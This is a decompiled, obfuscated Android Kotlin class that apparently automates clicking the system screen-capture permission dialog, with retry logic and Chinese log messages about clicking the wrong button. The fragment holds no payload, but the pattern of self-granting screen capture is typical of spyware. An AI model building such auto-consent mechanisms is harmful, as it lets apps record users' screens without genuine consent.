package com.storm.safe.rock.manager;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$handleMediaProjectionDialog$1", m214403f = "PermissionGranter.kt", m214404l = {2063}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$handleMediaProjectionDialog$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52018a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0260a2 f52019a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$handleMediaProjectionDialog$1(C0260a2 c0260a2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52019a2 = c0260a2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$handleMediaProjectionDialog$1(this.f52019a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((PermissionGranter$handleMediaProjectionDialog$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52018a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            this.f52018a1 = 1;
            if (b81.m210571b1(3000L, this) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
        }
        C0260a2 c0260a2 = this.f52019a2;
        if (c0260a2.f52110a2) {
            t60.m214726f4("PermissionGranter", "⚠️ [权限] 3秒后iuzxujjtqev仍未确认权限成功，可能点击了错误按钮");
            t60.m214726f4("PermissionGranter", "⚠️ [权限] 重置状态并重试或要求用户手动操作");
            c0260a2.f52118b0 = false;
            c0260a2.f52119b1 = 0;
            int i2 = c0260a2.f52114a6 + 1;
            c0260a2.f52114a6 = i2;
            if (i2 >= 8) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 建议用户手动点击权限对话框");
                c0260a2.m211321f8();
            }
        }
        return C1351vv.f60710b1;
    }
}
